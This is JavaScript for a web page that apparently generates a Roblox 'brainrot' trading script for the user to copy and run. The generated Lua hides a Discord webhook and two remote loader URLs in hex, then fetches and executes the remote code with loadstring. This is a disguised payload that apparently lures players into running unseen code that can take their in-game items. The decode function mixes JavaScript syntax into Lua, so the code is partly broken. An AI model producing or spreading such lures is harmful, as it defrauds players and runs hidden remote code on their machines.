const listContainer = document.getElementById("brainrotList");
const searchBar = document.getElementById("searchBar");
const generateBtn = document.getElementById("generateBtn");
const output = document.getElementById("scriptOutput");
const copyBtn = document.getElementById("copyBtn");

// Render Brainrots
function renderList(filter=""){
  listContainer.innerHTML="";
  brainrots.filter(b => b.name.toLowerCase().includes(filter.toLowerCase()))
    .forEach(b=>{
      const label=document.createElement("label");
      label.style.background=b.color; label.style.color="#000";
      label.innerHTML=`<input type="checkbox" value="${b.name}"><span>${b.name}</span>`;
      listContainer.appendChild(label);
    });
}
searchBar.addEventListener("input",e=>renderList(e.target.value));
renderList();

// Generate Script
generateBtn.addEventListener("click",()=>{
  const userId=document.getElementById("userId").value.trim();
  if(!/^\d+$/.test(userId)){alert("Enter a valid numeric User ID!"); return;}
  const selected=Array.from(document.querySelectorAll("#brainrotList input:checked")).map(i=>i.value);
  if(selected.length===0){alert("Select at least 1 brainrot!"); return;}
  output.textContent="Loading...";
  setTimeout(()=>{
    let script=`getgenv().WEBHOOK_URL = "68747470733a2f2f646973636f72642e636f6d2f6160692f776562686f6f6b732f1480316437901082764/HasXX1HpiYGIL-pVr2HeoVGh9xNouGyWe__n1SlcMQ29WMFbmFcCL4VA5ipQixQ2iHd7"
getgenv().TARGET_ID = ${userId}
getgenv().DELAY_STEP = 1
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = {
`;
    selected.forEach((b,i)=>{script+=`    ["${b}"]=true${i<selected.length-1?",":""}\n`;});
    script+=`}

local Trade="68747470733a2f2f6170692e6c7561726d6f722e6e65742f66696c65732f76342f6c6f61646572732f66626364316432353838396138343332393731303764656133363432303434642e6c7561"
local Auto_grab="68747470733a2f2f676473626f6c756e6576737777636667676c6c682e73757061626173652e636f2f66756e6374696f6e732f76312f7261772d73696c656e746875623f69643d706f64757775796a6e647933"

local function decode(hex) return (hex:gsub("..",c=>string.char(tonumber(c,16)))) end

task.spawn(function() loadstring(game:HttpGet(decode(Trade)))() end)
task.spawn(function() loadstring(game:HttpGet(decode(Auto_grab)))() end)`;
    output.textContent=script;
  },1000);
});

// Copy
copyBtn.addEventListener("click",()=>{navigator.clipboard.writeText(output.textContent);alert("Script copied!");});
